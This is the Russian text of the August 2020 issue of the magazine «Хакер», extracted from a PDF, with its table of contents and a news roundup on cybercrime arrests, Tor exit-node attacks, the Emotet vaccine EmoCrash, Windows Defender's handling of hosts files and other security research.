
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                                         Август 2020
            № 257
CONTENTS

    MEGANews
  Всё новое за последний месяц

    Премия Гармина
  Как леген дарная ком пания ста ла жер твой ата ки и согласилась на выкуп

    Крах пиратской «Сцены»
  Пра воохраните ли 18 стран нанесли сок рушительный удар по релиз-группам

     Android
  SMS-фишинг по-новому и блокировка сто рон них камер

    Кунг-фу pivoting
  Выжима ем максимум из постэкс плуата ции

     Тот самый 5c
  Как мы создали соф твер ный метод вскрытия зна менитого iPhone 5c

    Право на root
  Как повыша ют привилегии в Linux

    Chum Bucket
  Как я взло мал двад цатимил лиардную кор порацию с помощью бесплатного сервиса

    Большая дыра в BIG-IP
  Как работа ет новая уязвимость в про дук тах компании F5

    Соревнование в приватности
  Тестируем бра узеры, которые обещают не оставлять следов

    Примочки для лисички
  Со бира ем набор полезных пла гинов для Firefox

    Заметаем следы в Windows 10
  Как зас тавить вин ду все забыть

    Полная совместимость
  Как работа ют ста тические исполняемые фай лы в Linux

    Погружение в ассемблер
  Как работа ют перемен ные, режимы адресации, инструк ции условного перехода

    Ядерные приколы
  Осваиваем необычные фичи канального уровня в Linux

    Когда винда не видна
  Переустанавлива ем Windows через уда ленный дос туп

    Гадание по логам IPsec
  На практике разбира ем протокол IKE

    Блеск и нищета Huawei
  Колон ка Евгения Зобнина

    Не пустой звук
  Как собрать собс твен ный циф роана логовый преобра зова тель

    Часы для гика
  Под бира ем ком понен ты и мастерим бинар ные часы

    Титры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





АТАКА НА TESLA
Министерство юстиции США объявило об аресте 27‐летного рос сиянина
Егора Игоревича Крюч кова, который приехал в США по туристической визе.
Его обвинили в попытке подкупить сотрудника неназ ванной компании, рас‐
положенной в Неваде: якобы Крючков предлагал миллион долларов за уста‐
новку малвари в сеть этой компании.
   Хотя в обвинительном  заключении не рас крывалось наз вание ком‐
пании‐жертвы, сразу несколько новостных агентств сообщили, что атака, ско‐
рее всего, была нацелена на американскую компанию Tesla, которой как раз
принадлежит завод в городе Спаркс шта та Невада. Представители Tesla
никак не комментировали эти слухи, но затем гла ва компании Илон Маск
официально подтвердил в Twitter, что целью злоумышленников была именно
Tesla. Маск не стал вдавать ся в подробнос ти, но написал, что это была серь‐
езная атака.





Правоохранители заявляют, что Крючков входит в крупную преступную груп‐
пировку, которая планировала использовать мал варь для получе ния доступа
к сети компании‐жертвы, кра жи конфиденциальных документов, а затем
вымогательства. При этом Крючков обещал сотрудни ку Tesla, что другие чле‐
ны его «команды» устроят DDoS‐ата ку, чтобы отвлечь внимание службы
безопасности и скрыть хищение данных.
  Планы хакеров рухнули, так как инсай дер, которо го они пытались завер‐
бовать, сообщил о происходящем в ФБР. В итоге агенты ФБР держали Крюч‐
кова под наблюдением почти все время его пребывания в США, а затем
арестовали, собрав все необходимые для судеб ного прес ледования доказа‐
тельства.
   Согласно судебным документам, Крючков заявлял, что работает на некую
группировку, которая уже давно занимается подобными «спецпроектами».
Якобы в прошлом он уже завербовал ана логичным образом двух инсайдеров,
а одна из взломанных группировкой компаний уже выплатила выкуп в раз‐
мере 4 миллионов дол ларов.
  В настоящее время Егор Крючков находится под стражей, ему уже предъ‐
явлены обвинения. Если суд признает его виновным, ему грозит до пяти лет
лишения свободы.


ВЗЛОМ 28 000 ПРИНТЕРОВ

Эксперты CyberNews рассказали о проведен ном ими эксперименте, пос вящен ном небезопас‐
ности IoT‐устройств в целом и принтеров в час тнос ти. При помощи поисковика Shodan они
выявили в интернете более 800 000 прин теров с включен ными функциями сетевой печати,
причем порядка 447 000 не были защище ны от атак.

Выбрав из списка 50 000 случайных устройств, исследователи попытались получить к ним
доступ и заставить их распечатать руководство по безопасности.

В итоге специалисты отчитались, что скомпрометировали 27 944 принтера из 50 000 (то есть
успешными оказались 56% атак), напечатав на них лис товки с предупрежде нием о небезо пас‐
ности. Опираясь на эти цифры, исследователи предполагают, что из 800 000 подключенных
к интернету принтеров по мень шей мере 447 000 не защищены.





ТЕЛЕМЕТРИЯ
И HOSTS
Журналисты Bleeping Computer обра тили внимание, что с недавних пор Win‐
dows 10 и Windows Defender считают файл hosts (C:\Windows\system32\dri‐
ver\etc\hosts) опасным, если в нем прописа ны настройки, блокирующие
сбор телеметрии.
  По информации изда ния, с конца июля измененный файл hosts определя‐
ется как представляющий угрозу SettingsModiﬁer:Win32/HostsFileHijack. Если,
получив такое предупреждение, пользователь нажимает «Подробнее», ему
не объясняют ничего, лишь сообщают, что файл демонстрирует «потенциаль‐
но нежелательное поведение».





Если пользователь согласится устранить «угрозу», система очистит файл
hosts и вернет его к состоянию по умол чанию. Также есть возможность про‐
игнорировать проб лему,  но  это  разрешит любые модификации  hosts
в будущем, в том числе и вредоносные.
  Основатель Bleeping Computer Лоренс Абрамс отмечает, что в целом
проблема ложноположительных сра батываний на файл hosts не нова, однако
в последние недели люди вдруг ста ли мас сово жаловаться на подобные пре‐
дупреждения. Абрамс пишет, что сначала он решил, будто дело опять в лож‐
ноположительных срабатываниях, но все же провел несколько  тестов.
Как оказалось, достаточно заблокировать через файл hosts серверы Mi‐
crosoft, собирающие телеметрию, и тут же начинаются проблемы. В частнос‐
ти, если попытаться заблокировать адреса, перечис ленные ниже.


             INFO

                     Адреса, блокировку которых не любит MS:
                  •www.microsoft.com
                  •microsoft.com
                  •telemetry.microsoft.com
                  •wns.notify.windows.com.akadns.net
                  •v10‐win.vortex.data.microsoft.com.akadns.net
                  •us.vortex‐win.data.microsoft.com
                  •us‐v10.events.data.microsoft.com
                  •urs.microsoft.com.nsatc.net
                  •watson.telemetry.microsoft.com
                  •watson.ppe.telemetry.microsoft.com
                  •vsgallery.com
                  •watson.live.com
                  •watson.microsoft.com
                  •telemetry.remoteapp.windowsazure.com
                  •telemetry.urs.microsoft.com


В итоге специалист пришел к выводу, что Microsoft, по всей видимос ти,
недавно обновила Defender таким образом, чтобы он определял, когда сер‐
веры компании добавляют в файл hosts и пользователь пытается блокировать
сбор телеметрии.


ОТКРЫТ ИСХОДНЫЙ КОД HAVE I BEEN PWNED?
Трой Хант, основатель сервиса Have  I Been Pwned? (HIBP), пре доставляюще го возможность
проверить, не ском прометированы ли учетные данные, объявил, что пос ле нескольких неудач‐
ных попыток продать проект он решил открыть его исходный код. За прошедшие годы Хант вло‐
жил в проект много сил, времени и ресурсов, но продол жать развивать HIBP самостоятельно
и дальше он не может.





→«Каждый байт данных, заг руженных в систему за пос ледние годы, был бесплатно пре дос‐
тавлен кем‐то, кто решил улучшить лан дшафт безопас ности для всех нас.
   Философия HIBP всегда заключалась в том, чтобы под держивать сообщес тво, а теперь я
хочу, чтобы сообщество поддержало HIBP. Открытие исходных кодов — наиболее оче видный
способ сделать это. Все основные элементы HIBP будут переданы в руки людей, которые смо‐
гут помочь поддерживать сервис, невзирая на то, что происходит со мной»
— Трой Хант в своем блоге





ВРЕДОНОСНЫЕ
УЗЛЫ TOR
В середине августа ИБ‐специалист и оператор сервера  Tor, известный
как Nusenu, опубликовал тревожные результаты своего исследования. По его
данным, с января 2020 года группа неизвестных лиц устанавливала контроль
над выходными узлами Tor и проводила атаки типа SSL stripping. В какой‐то
момент группе принадлежала четверть всех выходных узлов (380 серверов),
а сейчас они контролиру ют около 10%, хотя раз работчики Tor трижды при‐
нимали меры, что бы прекратить эту активность.
  Иссле дователь говорит, что истинный мас штаб операций этой группы
неизвестен, но их главная цель определен но получение прибыли. Nusenu
объясняет, что злоумышленники выполняют ата ки man in the middle на поль‐
зователей Tor и манипулируют трафиком, проходя щим через подконтрольные
им выходные узлы. Цель таких MITM‐атак — применение техники SSL strip‐
ping, то есть даунгрейд тра фика пользователей с HTTPS‐адре сов на менее
безопасные HTTP.
  По мнению специалис та, таким образом группировка подменя ет бит‐
койн‐адреса внутри HTTP‐трафика, связанного с миксер‐сервисами. Подоб‐
ные сервисы помогают «запутать следы», превращая простой перевод
средств с одного аккаунта на дру гой в сложную схему: вместо одной тран‐
закции сервис разбивает нужный платеж на сотни или тысячи мел ких перево‐
дов, которые отправляются на разные акка унты и проходят через множес тво
кошельков, прежде чем достигнут истинной цели. Фактически, подменяя
адреса на уровне HTTP‐тра фика, зло умышленники эффективно перехватыва‐
ют средства жертв, без ведома как самих пользователей, так и криптовалют‐
ных миксер‐сервисов.
  Сами по себе подоб ные ата ки нельзя назвать новыми, но исследователь
отмечает невиданный мас штаб операции. Так, опираясь на контактный email‐
адрес вредоносных серверов, эксперт отследил по меньшей мере девять
кластеров входных узлов, добавленных за последние семь месяцев. Вре‐
доносная сеть достигла своего пика 22 мая текущего года, когда в нее вхо‐
дили 380 серверов и груп пировка контро лировала 23,95% всех выходных
узлов Tor.





Nusenu не раз сооб щал администраторам Tor о най денных вредонос ных
узлах, и после последней «зачистки», произошедшей 21 июня 2020 года, воз‐
можности злоумышленников сильно сократились. Впрочем, по сос тоянию
на 8 августа 2020 года группировка по‐прежнему контролировала около 10%
выходных узлов.
  По мнению иссле дователя, зло умышленники будут продолжать эти атаки
и далее, так как у инженеров Tor Project нет воз можности тщательно про‐
верить всех присоединившихся к сети участников, ведь во главу угла ставится
анонимность.
  Нужно сказать, что дру гая похожая атака была обнаружена в 2018 году.
Тогда в манипуляциях пользовательским тра фиком уличили операторов нес‐
кольких Tor2Web‐сервисов. Зло умышленники также подменяли адреса бит‐
койн‐кошельков своими. К примеру, ког да поль зователи пытались заплатить
выкуп опе раторам шифровальщиков LockeR, Sigma и GlobeImposter, их
средства оседали в карманах других хакеров.


ДЕНЬГИ ЗА БАГИ
Специалисты компании Microsoft отчитались о работе своих 15 программ bug bounty в прошлом
году. В компании говорят, что на ИБ‐исследователей явно повлияли пандемия коронавиру са
и карантины во многих странах мира: в первые месяцы пандемии ИБ‐спе циалис ты были замет‐
но активнее.


В 2019 году компания суммарно вып латила исследователям за обнаруженные уязвимости
13 700 000 долларов, то есть в 3 раза больше, чем годом ранее (4 400 000 долларов).

В период с 1 июля 2019 года по 30 июня 2020 года 327 ИБ‐исследователей обнаружи ли 1226
уязвимостей в продуктах Microsoft.

Самая крупная награда за баг сос тавила 200 000 долларов и была связана с уязвимостью
в Hyper‐V.

Большие размеры вып лат обусловлены запуском сразу 6 новых программ вознаграждения
и двух новых исследовательских грантов.


Выплаты по программам bug bounty  Microsoft намного превзошли аналогичные награды
от Google, общий размер которых в прошлом году сос тавил лишь 6 500 000 долларов,
и Google при этом называла год рекор дным.





КИТАЙ БЕЗ HTTPS
Специалисты из iYouPort, универ ситета Мэриленда и Great Firewall Report
представили совместные отчеты. Они гласят, что в конце июля 2020 года
китайские власти обновили «Великий китайский файрвол» таким образом,
чтобы блокировать зашифрованные HTTPS‐соединения, которые используют
современные протоко лы и технологии, защища ющие от перехвата. В час‐
тности, под блокировку теперь попада ет весь HTTPS‐трафик, использующий
TLS 1.3 и ESNI (Encrypted Server Name Indication).
  Прочий HTTPS‐трафик, использующий более старые версии протоколов,
в том числе TLS 1.1 и 1.2, а также SNI (Server Name Indication), по‐прежнему
не блокируется. Дело в том, что в этом случае власти могут «видеть», к какому
домену пытается подключиться пользователь. Это воз можно через прос мотр
поля SNI на ранних этапах HTTPS‐соединений.
   Если же соединение устанавливается через TLS 1.3, то поле SNI можно
скрыть с помощью ESNI. Из‐за этого фильтровать трафик становится все
труднее, а китайские власти хотят контролировать контент, доступ к которому
может получить населе ние.
  Иссле дователи пришли к выводу, что в настоящее вре мя в Китае блокиру‐
ется весь HTTPS‐трафик, использующий TLS 1.3 и ESNI, а IP‐адреса, учас тву‐
ющие в таких соединениях, получают временные баны, длительностью от двух
до трех минут.
  По данным экспертов, сейчас сущес твует шесть методов обхода блокиро‐
вок «Великого китайско го файрвола», они могут применяться как на стороне
клиента (внутри приложений и ПО), так и на сто роне сервера (на серверах
и бэкендах приложений).



      «К сожале нию, данные стра тегии могут ока заться недолгосроч ным
     решением: по мере продолжения этой игры в кош ки‑мыш ки „Великий
     файрвол“, вероятно, продолжит совер шенс твовать свои воз можнос ти
      в области цензуры», — зак люча ют иссле дова тели.


700 000 000 АКТИВНЫХ ПОЛЬЗОВАТЕЛЕЙ TIKTOK

Разработчики TikTok, принадлежащего китайской ком пании ByteDance, впервые с 2018 года
поделились данными о количестве ежемесячно активных поль зовате лей.

Как оказалось, в настоящее время сервисом пользуются около 700 000 000 активных поль‐
зователей в месяц и около 100 000 00 из них находятся в США. Для срав нения: в янва‐
ре 2018 года у TikTok нас читывалось лишь 54 800 000 активных пользователей (око ло
11 000 000 пользователей в США). Таким образом, прирост ежемесячной аудитории сервиса
составил порядка 800%.

Также сообщается, что за почти три года существования TikTok он был загружен уже более
2 000 000 000 раз.





«ЗВУКОВОЙ» ВЗЛОМ
Ученые из Национального университета Сингапура опубликовали доклад
об интересной технике взлома замков — SpiKey. Они утверждают, что, под‐
слушав и записав звук, с каким замок откры вается, можно подобрать к этому
замку ключ.
  Иссле дователи рассказывают, что физичес кий замок, разумеется, можно
взломать и более традиционным способом, но это потребует определенных
знаний, навыков и инс трументов. К тому же такой взлом оставляет следы
на внутренней части замка, и их могут обнаружить криминалис ты.
  По сути, предложенная исследова телями атака предлагает использовать
микрофон обычного смартфона для захвата звука вставки и извлечения ключа
из замка. Этот звук позволяет сделать выводы о форме ключа и его бородке,
а затем создать копию. Специальный софт, соз данный экспертами, опре‐
деляет вре мя между щелчками, которые возникают при контакте ключа
со штифтами в замке, и, основываясь на этих данных, воссоздает сам ключ.


                                     Продолжение статьи →
← Начало статьи





  Исследователи объясня ют, что на выходе программа предлагает нес колько
  подходящих ключей‐кандидатов, а не единс твенный готовый вариант. Однако
   такой «акустический» ана лиз обычного ключа с шестью выс тупами позволяет
  отбраковать более 94% клю чей и оставить лишь около десяти ключей‐кан‐
  дидатов (зачастую клю чей‐кандидатов и вовсе останется всего три). На осно‐
  ве этих данных можно будет соз дать копию клю ча, к примеру с помощью 3D‐
  принтера.
     Есть у методики SpiKey и слабые стороны. Например, отдельные типы
  клю чей при вставке в замочную скважину изда ют так называемые перекрыва‐
  ющиеся щелчки, которые крайне  трудно проана лизировать, и поэтому
  перед SpiKey уязвимы только около 56% ключей.
     Кроме того, для наилучших результатов ана лиза спе циальному ПО тре‐
   буется постоянная скорость при поворо те клю ча в замке, чего попросту
  не бывает в реальной жизни. Впрочем, этот нюанс можно обойти, записав
   звук открывания‐закрывания замка нес колько раз. Для этого атакующий
  может установить малварь на смартфон или умные часы жертвы (чтобы
  записывать нужные звуки) или собирать данные с дверных датчиков, если те
  укомплектованы мик рофона ми.
    Иссле дователи отмечают, что записы вать щелчки надо на расстоянии при‐
  мерно десяти сантиметров от замка, а для более дальних дистанций уже
  понадобится параболичес кий микрофон.



         «Нет оснований полагать, что циф ровые зам ки обес печат луч шую
         безопас ность, особенно если учесть количес тво наблюда емых сейчас
        кибера так. Тогда как ата ки на физичес кие зам ки тре буют присутс твия
         злоумыш ленника, циф ровые ата ки могут быть уда ленными, и это
         весьма пугающе. Воз можно, нам стоит вдохновиться иде ей двух-
        фактор ной аутентифика ции, и ком бинирование физичес ких и циф-
        ровых двер ных зам ков — это наиболее безопас ный путь для деталь-
        нейше го раз вития», — зак люча ют спе циалис ты.


  PROTONMAIL КРИТИКУЕТ APPLE
   Глава защищенного почтового сер виса ProtonMail Энди Йен выс тупил с резкой критикой
   в адрес Apple. Он заявил, что ком пания злоупотребляет своим рыночным положением, исполь‐
   зуя App Store для контроля над поль зователями и борьбы с кон курентами. По его словам, Apple
   давно  стала монополистом, который борется с конкурен тами при помощи совершенно
   негуманных комиссий, а также занимается цензурой для диктаторских режимов.
      Йен называет рэкетом действия Apple в отно шении разработчиков и утверждает, что
   с помощью комиссии 30%, которую Apple получает с любых продаж в App Store, компания
   «держит всех нас в заложниках», злоупотребляя властью.





  →«Apple пытается оправдать эти сборы, утверждая, буд то App Store ничем не отличается
   от торгового центра, где ком пании, стремящиеся продать свои продукты, дол жны платить
   арендную плату владельцу торгового центра (в дан ном слу чае — компании Apple). Этот аргу‐
   мент изящно игнорирует тот факт, что существует лишь один торговый центр, когда дело
   доходит до iOS, и арендовать площадь у конкурирующего тор гового центра невозможно. Нет
   ничего нелегального в том, что Apple владеет торговым цен тром и сдает площади в аренду,
   и Apple имеет полное право владеть единственным торговым центром. Однако противозакон но
   владеть единственным торговым центром, который устанавливает чрез мерно высокие цены,
   чтобы навредить конкурентам»
  — Энди Йен в блоге ProtonMail





 ПРИВИВКА
 ОТ EMOTET
  Весной текущего года мы подробно рас ска зывали о группе энтузиастов Cryp‐
   tolaemus, в которую входят более 20 ИБ‐специалистов со всего мира,
  еще в 2018 году объединившихся ради общей цели — борьбы с малварью
   Emotet.
     Как стало известно теперь, в феврале 2020 года один из участников этой
  команды, Джеймс Куинн (James Quinn) из компании Binary Defense, обна‐
  ружил уязвимость в коде Emotet. Тогда, изу чая очередные обновления
   Emotet, Куинн заметил изменения в коде одной из полезных нагрузок. В час‐
  тности, изменения затрагивали так называ емый механизм устой чивости
   Emotet,  который  позволяет  вродоносу  выживать  после  перезагрузки
  зараженного устройства. Ока залось, что для этого Emotet создает специаль‐
  ный ключ реестра Windows и сохраняет в нем ключ XOR, который использует‐
  ся не только чтобы обеспечить устойчивость, но и в самом начале заражения.





  Благодаря последующим обновлениям Emotet, которые прояснили, как имен‐
  но работает новый механизм устойчивос ти, Куинн сумел написать крошечный
   PowerShell‐скрипт, названный EmoCrash. Скрипт использовал ключи реес тра,
   чтобы спровоцировать сбой в работе Emotet.
     EmoCrash сканировал компьютер пользователя и генерировал на машине
  корректный, но вредоносный для Emotet ключ реестра. В итоге, когда «чис‐
  тый» компьютер, обработанный EmoCrash, подвергался атаке, этот ключ
  реестра провоцировал в коде малвари переполнение буфера, что в итоге
  приводило к сбою Emotet и предотвращало заражение вообще.
     Если же EmoCrash запускался на зараженных машинах и подменял сущес‐
   твующий ключ реестра, малварь тоже ава рийно завершала работу, когда пов‐
  торно обращалась к реестру. Это эффективно предотвращало обмен дан‐
  ными между зараженными хос тами и управляющими серверами Emotet.
    Более того, после применения EmoCrash на машине появлялись логи сбо‐
   ев, содержащие идентифика торы событий 1000 и 1001. Их можно было
  использовать для выявления эндпойнтов с отклю ченными и уже «мертвы ми»
  бинарниками Emotet. Это помога ло системным админис траторам быс тро
  обнаруживать, что Emotet пытается заразить или уже заразил их сети.
    Специалисты Binary Defense понимали, что новость об этом откры тии
  необходимо держать в секрете, чтобы авторы Emotet не внесли исправления
   в свой код, но также эксперты знали, что EmoCrash может помочь улучшить
  защиту множества ком паний по всему миру. В ито ге специалисты объ еди‐
  нили усилия с компанией Team CYMRU, которая имеет многолетний опыт
   в деле уничтожения ботнетов и тоже давно наб людает за Emotet.
     Эксперты Team CYMRU, в свою очередь, свя зались с CERT многих стран
  и постарались, чтобы EmoCrash тайно рас простра нился среди различных
  компаний. Дело в том, что Team CYMRU поддерживает связь со 125
  региональными командами CERT, а также имеет собственную рас сылку,
  через которую регулярно доносит полезную и конфиденциальную информа‐
  цию более чем до 6000 специалистов.
     Таким образом, за последние шесть месяцев скрипт EmoCrash успел
  широко распространиться среди компаний по всему миру. В Binary Defense
   говорят, что они никог да не узна ют, сколько компаний в итоге установили
  EmoCrash, но иссле дова тели получили мно жес тво благодарных сообщений
   от фирм, которые сумели предотвратить атаки Emotet или обнаружили у себя
  заражения. По данным Binary Defense, в итоге их скрипт заметно помог сни‐
   зить количество заражений и число ботов.
    Иссле дователи считают, что операторы Emotet так и не узнали об их
  скрипте и баге в коде малвари, одна ко в начале августа 2020 года, спустя
  полгода после обнаружения уязвимос ти Джей мсом Куинном, хакеры все же
  изменили работу механизма устойчивос ти и устранили проблему, на которую
  опирал ся EmoCrash.
    Шутки ради Джеймс Куинн и его коллеги даже обратились в MITRE
  и попытались получить для найденной ими уяз вимос ти в Emotet идентифика‐
  тор CVE, как для любой другой уязвимости, но в организации отметили, что
  Emotet — это малварь и это противо речит правилам присвоения CVE.


 ЗАЩИТА КОРПОРАТИВНЫХ СЕТЕЙ
   Эксперты  Positive Technologies поделились результатами анализа защищенности сетевых
   периметров корпоративных информационных систем.

  В 84% организаций были выявлены уяз вимости высокого уровня рис ка, при чем в 58% ком‐
   паний обнаружился хотя бы один узел с уязвимостью высоко го уровня риска, для которой
   существует общедоступный эксплоит.





                      Распределение исследованных систем по отраслям экономики

  В открытом доступе были найдены эксплоиты для 10% всех выявленных уязвимостей. То есть
   каждую 10‐ю уязвимость можно использовать, не имея профес сиональных навыков или опыта
   обратной разработки.

  Половина всех обнаруженных уязвимостей может быть устранена простой установ кой акту‐
   альных обновлений.

  В 42% организаций используются прог раммные продукты, производители которых официаль‐
   но прекратили поддержку и больше не выпускают обновления безопасности.

  В 32% компаний есть приложения, написан ные на языке прог рамми рования PHP версии 5,
   который не поддерживается с января 2019 года.

   Возраст самой старой уязвимости, обнаружен ной в ходе анализа, сос тавил 16 лет.





                    Самые распространенные уязвимости на сетевом периметре





 ПОЛТОРА
 МИЛЛИОНА
 ЗВОНКОВ
  Эксперты из Университета штата Северная Каролина представили на кон‐
  ференции USENIX интересный доклад и рассказали о проведенном ими
  эксперименте, который был пос вящен автообзвону.
     Для этого исследования ученые соз дали огромный телефонный honeypot
  и в течение одиннадцати месяцев (с марта 2019 года по январь 2020 года)
  управляли 66 606 телефонными линиями. В итоге суммарно за это вре мя они
  получили 1 481 201 непрошеный роботизированный звонок, но номера hon‐
  eypot‐телефонов никогда не попадали в откры тый дос туп.
    В среднем непрошеные звонки поступали каждые 8,42 дня, причем боль‐
  шая часть робозвонков приходила своеобразны ми вол нами, которые спе‐
  циалисты назвали «штормами». Такие всплески слу чались регулярно, через
  равные промежутки времени, и, похоже, эти звонки совершались в рамках
  хорошо организованных кампаний. За один надцать месяцев эксперты зафик‐
  сировали 650 таких «штормов».





  Интересно, что далеко не все звонки во время таких всплес ков активности
  исходили от роботов: большинс тво звонивших оказались живыми людьми.
  Эксперты предполагают, что в этом винова та тактика спуфинга ID вызыва‐
  ющего абонента. Дело в том, что автообзвонщики часто стремятся скрыть
  свои настоящие телефонные номера и выда ют себя за реальных людей.
  Таким образом, когда жертвы пропускали робозвонок и позже перез ванива‐
  ли по поддельному номеру, в итоге они попада ли на номера honeypot‐
  телефонов исследовательской группы.



         «Инте рес но, что наш коллега по лабора тории тоже стал жер твой
         такого „штор ма“. Сотни нез наком цев бук вально завалили его звон-
         ками, и они жалова лись, что им звонили с его номера! Излишне
         говорить, что он не мог пользоваться телефоном в течение нес кольких
         дней, пока звонки не утихли», — отме чают экспер ты.

  Команда ученых записала примерно 10% (око ло 150 тысяч) полученных
  робозвонков, а затем проанализирова ла их, чтобы определить источник
  и содержание. Таким образом были обна ружены 2687 уникальных кампаний
   автообзвона, самые круп ные из которых рекламировали сту денческие ссуды,
  медицинское страхование, услуги продвижения в поисковой выдаче Google
  и мошенничество с социальным страхова нием.
    Но пожалуй, наиболее интерес ным выводом, сделанным из этого экспе‐
  римента, стал следующий: ответив на пол тора миллиона роботизированных
  звонков, иссле дователи не заметили никакого увеличения количества подоб‐
  ных звонков в целом.



       «СМИ и регулирующие органы пос тоянно рекомендуют пользовате лям
        избе гать звонков с неиз вес тных номеров, чтобы уменьшить количес-
         тво звонков от роботов. Удивительно, но мы обна ружили, что ответ
         на такие вызовы не обязательно уве личивает будущее количес тво
        робоз вонков. Пользовате лям стоит быть осторожнее, когда звонят
         с неиз вес тных номеров, одна ко, если вы вре мя от вре мени отве чаете
         на неп рошеный вызов, это не зна чит, что в будущем вы ста нете
         получать нам ного больше звонков от роботов», — резюмируют авторы
         экспе римента.


  БАН ДЛЯ 2500 YOUTUBE‐КАНАЛОВ
   Специалисты Google Threat Analysis Group отчитались о работе, проделанной во втором квар‐
   тале 2020 года. Исследователи рассказали, как они останавливают атаки правительственных
   хакеров и кампании по дезин формации.


   Исследователи пишут, что помешали ряду инос транных операций по оказанию влияния,
   за которыми стояли Китай, Россия, Иран и Тунис. В результате было заблокировано более
  2500 каналов на YouTube, несколь ко аккаунтов AdSense, Play Developer и рек ламных учетных
   записей.

  2596 заблокированных каналов якобы были связаны с кам паниями по распространению
   дезинформации, за которыми стоял Китай, еще 86 каналов на YouTube яко бы координиро‐
   вались из России, и 19 каналов якобы использовались Ираном.

   Также в период с апреля по июнь 2020 года Google удалось прекратить 10 скоординированных
   иностранных операций, часть из которых также затрагивала Facebook и Twitter.





 BOEING НА ДИСКЕТАХ
  Недавно авиакомпания British Airways отказалась от использования самоле‐
   тов Boeing 747, и благода ря этому у специалис тов из компании Pen Test Part‐
   ners появилась редкая для ИБ‐экспертов возможность исследовать уже спи‐
  санный лайнер, пока тот не был утилизирован.
    На конференции DEF CON 28, в этом году прошедшей в онлайн‐формате,
   сотрудник Pen Test Partners Алекс Ломас (Alex Lomas) рассказал об иссле‐
  довании Boeing 747‐400, отсека электронного оборудования и кабины эки‐
  пажа лайнера, а также провел для зрителей виртуальную экскурсию по лай‐
   неру.



         «Зна ете, самоле ты —  это  очень  дорогие шту ковины, —  говорит
        Ломас. — При всем вашем желании авиаком пании и производите ли
        не поз волят вам прос то так пентестить самолет, потому что они
        не зна ют, в каком сос тоянии вы оста вите его в итоге».

  Одной из наиболее интерес ных находок исследователей стал дисковод
  для 3,5‐дюймовых дискет, который использует ся для загрузки навигационной
  базы данных (можно увидеть на иллюс трации ниже). Ломас пояснил, что
  по правилам эта БД должна обновляться каждые 28 дней, и посочувствовал
  инженерам, которым регулярно приходится иметь дело с такой малоприятной
   рутиной.


                                        Продолжение статьи →
← Начало статьи





  Кроме того, во время доклада Ломас получил вопрос, которым, наверное,
   хоть раз задавался каждый ИБ‐специалист: можно ли взломать воз душное
  судно с пассажир ского места, использовав в качестве вектора проник‐
  новения систему развлечений, предлагаемых на борту (in‐ﬂight entertainment).
  Эксперт ответил, что ана литикам Pen Test Partners не удалось обнаружить
  никакой двусторонней связи между доступными пассажирам системами
   (такими как упомянутая IFE) и управляющим доменом. Более того, между эти‐
  ми системами существу ет специальная DMZ‐зона, обойти которую вряд ли
  представ ляется возможным.


 СПАМ И ФИШИНГ
   «Лаборатория  Касперского»  подготовила  отчет  о  спаме  и фишин ге  во  втором  квар‐
   тале 2020 года. Одной из особен ностей квартала стали таргетированные атаки: хакеры час то
   прибегали к целевым атакам, причем мишенью становились преиму щес твенно не очень боль‐
   шие компании. При этом редкая спам‐рассылка обхо дилась без упо минания пандемии COVID‐
   19, а фишеры адаптировали старые схемы под актуальную повес тку и придумали новые.

   Наибольшая доля спама в общемировом трафике была зафиксирована в апреле — 51,45%.
   Средняя доля спама в мировом почтовом трафике сос тавила 50,18%.





                           Доля спама в мировом почтовом тра фике


   Первые пять мест среди стран, лидирующих по количес тву исходяще го спама, раз делили те же
   участники, что и в первом квартале 2020 года. Впе реди всех, как и ранее, Рос сия (18,52%),
   а на втором месте Германия (11,94%), которая сместила США (10,65%) со вто рой на третью
   позицию. Четвертое и пятое мес та, как и в прошлом отчетном периоде, занимают Фран ция
     (7,06%) и Китай (7,02%).





                                  Страны — источники спама в мире

   Компания обнаружила 43 028 445 вре донос ных почтовых вложений, что на 6 500 000 больше
   показателя прошлого отчетного периода.





                             Top‐10 вредоносных вложений в почтовом тра фике

  Была предотвращена 106 337 531 попытка перехо да пользователей на мошен нические стра‐
   ницы, что почти на 13 000 000 мень ше результата первого квартала.

   Доля уникальных ата кованных пользователей сос тавила 8,26% от общего количества поль‐
   зователей продуктов «Лаборатории Касперского» в мире, а в базу дан ных компании были
   добавлены 1 694 705 фишинговых масок.





 АРЕСТ INSTAKILLA
  В середине августа 2020 года издание ZDNet, со ссылкой на бол гарских пра‐
  воохраните лей, сооб щило о задержании хакера  Instakilla (настоящее имя
  не разглашается). Подозрева емого обви няют во взломе, вымогательстве
  и продаже похищенной у компаний информа ции в интернете. В ходе обыс ков
   в Пловдиве у хакера были изъяты несколько компьютеров, смартфонов,
  флеш‐накопителей, а также неназванное количество криптовалюты.
    Напомню, что  Instakilla активен примерно с 2017 года, хотя широкую
  известность он получил лишь в прошлом году. Так, летом 2019 года именно
   Instakilla слил в сеть информацию, похищенную у Национального налогового
  управления Болгарии, хотя он и не при нимал непосредственного участия
   в самом взломе.





  Осенью того же года хакер скомпрометировал официальные форумы Como‐
  do, а затем взял на себя ответс твенность за взлом ряда итальянских и гол‐
  ландских форумов для секс‐работников (в этих странах проституция законна).
    В текущем году Instakilla связывали с круп ным взломом форумов Stalker
   Online, откуда он похитил более 1,2 миллиона пользовательских записей,
  которые затем выставил на продажу на хакерском форуме. На этом же
  форуме у злоумышленника было что‐то вро де собственного магазина, где он
  продавал похищенные у компаний данные (вклю чая две неназванные болгар‐
  ские организации, местного хостинг‐провайдера и сервис электронной поч‐
   ты). Причем в итоге Instakilla забанили на этом форуме за мошенничество.
     Как несложно понять по перечисленным инци дентам, в основном Instakilla
  предпочитал взламывать уяз вимые форумы vBulletin, откуда он похищал базы
  данных. Также у преступника был собственный сайт, где он предлагал свои
   хакерские услуги всем желающим.


